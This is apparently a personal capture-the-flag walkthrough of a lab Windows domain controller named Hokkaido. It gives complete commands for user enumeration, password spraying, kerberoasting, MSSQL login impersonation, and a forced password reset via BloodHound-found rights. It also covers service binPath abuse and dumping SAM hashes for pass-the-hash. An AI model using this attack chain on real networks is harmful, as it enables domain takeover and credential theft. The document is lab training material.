smb, ldap, rpc locked down. port 80 seems to be default webpage
except for ldaps, ms-sql-s, winrm, rdp, nmap also showed
ports 8530, 8531, 47001
No hits, so looked for hints, which said user bruteforce and password bruteforce
Umm..we dont do that here
Anyways, the way is to use kerbrute to get user list
Then nxc smb user:user
Then seasons:year

`./kerbrute userenum --dc 192.168.110.40 -d hokkaido-aerospace.com /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt`
we find info@hokkaido and admin@hokkaido
`nxc smb IP -u users.txt -p users.txt`
we get a hit on info:info

---
as Info ,we enumerate users, shares.
for the discovered users, we try asrep-roasting, nothing
and we try kerberoasting
```zsh
impacket-GetUserSPNs -dc-ip 192.168.110.40 hokkaido-aerospace.com/info
#maintenance and discovery
impacket-GetUserSPNs -dc-ip 192.168.110.40 hokkaido-aerospace.com/info -request-user maintenance
impacket-GetUserSPNs -dc-ip 192.168.110.40 hokkaido-aerospace.com/info -request-user discovery
```
wouldnt crack, as expected

we did discover a writable share for info, with "homes" of the users
and the strange thing we discover, all users' passwords were set at the same time, except for Hazel.Green, and a couple of theres, whose names are't in the "Homes" share

So, we'll try ntlm_theft on their home, with hopes they cough up an ntlm challenge-response for us, nothing!

Anyways, we proceed with other auths, rdp, winrm, mssql. We only have mssql
so, we fire up impacket-mssqlclient
`impacket-mssqlclient hokkaido-aerospace.com/info:'info'@192.168.110.40 -windows-auth`
No enable_xp_cmdshell, no exec xp_cmdshell, no users in enum_impersonate

HINT TAKEN :  dont ignore SYSVOL. offsec loves hiding shiz in there

rerun spiderplus, to discover syscol/hokk/scripts/tmp has a reset_password.txt
with 'Start123!'
upon spraying the pass, we find discovery:Start123!
so we spray the creds across protocols, to find smb, mssql

---
`impacket-mssqlclient hokkaido-aerospace.com/discovery:'Start123!'@192.168.110.40 -windows-auth`
no enable_xp_cmdshell access, no exec xp_cmdshell as well
```sql
--show databases
SELECT name FROM master..sysdatabases;
--shows a few databases, but hrappdb catches the eye
use hrappdb
--not allowed

--so we check if we can impersonate anyuser
enum_impersonate
--shows hrappdb-read

EXECUTE AS LOGIN = 'hrappdb-reader'

SELECT name FROM master..sysdatabases;
use hrappdb

--show tables
SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
--we see a table sysauth

select * from sysauth;
--b'hrapp-service'   b'Untimed$Runny'
```
so we spray creds over protocols
no luck on any, except on ldap

At this point, seeing as there's no other way forward, we bloodhound
with info's creds, there was some error. but discovery and hrapp-service creds worked for bh

we discover info and discovery aint got shiz.
But hrapp-service has 'GenericWrite' over Hazel.Green, who is a Tier-2 Admin
And she, in turn, has a ForceChangePassword on Molly.Smith, who is a Tier1 admin, and has rdp and a member of Server Operators

```zsh
#first, targeted kerberoast on hazel green
python /opt/targetedKerberoast/targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny'
#get hazel's hash, crach it to be haze1988

bloodyAD --host 192.168.110.40 -d hokkaido-aerospace.com -u Hazel.Green -p 'haze1988' set password 'Molly.Smith' 'newPassword1!'
#OR
nxc smb 192.168.110.40 -u hazel.green -p haze1988 -M change-password -o USER=molly.smith NEWPASS='newPassword1!'

xfreerdp3 /u:'Molly.Smith' /p:'newPassword1!' /v:192.168.110.40 /dynamic-resolution
```

molly!

---
as a member of Server Operators group, we can see the services we can modify, and hence replace it with an msfvenom payload
But there was an antivirus sitting, so we had to settle for adding molly to Administrators
```powershell as administrator
services
#this wasnt giving anything, so we decide to use the one from one of our previous exploits, VMTools
sc.exe qc VMTools
sc.exe config VMTools binPath="cmd /c net localgroup Administrators molly.smith /add"
#did not work!
```

Since we also had seBackup and seRestore, we go for the big guns
for ntds, we need diskshadow and winrm's robocopy

so we hope for sam and system hives
```
reg save hklm\system system.hive
reg save hklm\sam sam.hive
```

fire up the file server
transfer them hives, secretsdump
`impacket-secretsdump -system system.hive -sam sam.hive -ts local`
`impacket-psexec Administrator@hokkaido-aerospace.com -hashes :d752482897d54e239376fddb2a2109e4` --> DIDNOT work
then did an evil-winrm, and it worked
admin!

---
---
---
Server Operators Group - failure : 
The reason modifying the service did not work, was because `services` wasnt running, and we dint know which services we had access to overwrite
When that happens, we use the accesschk.exe
Transfer it to windows
```powershell as admin
.\accesschk.exe -cuwqv "molly.smith" *
#we see a long list, possibly all. pick one like AppReadiness. we try something different
sc.exe qc AppIDSvc
.\accesschk.exe -cuwqv "molly.smith" AppIDSvc

sc.exe config AppIDSvc binPath= "cmd /c net localgroup Administrators molly.smith /add"
#dint work, so we try for some other one
sc.exe config wisvc binPath= "cmd /c net localgroup Administrators molly.smith /add"
#dint work neither
#Just stick with AppIDScv or VMTools or AppReadiness
```


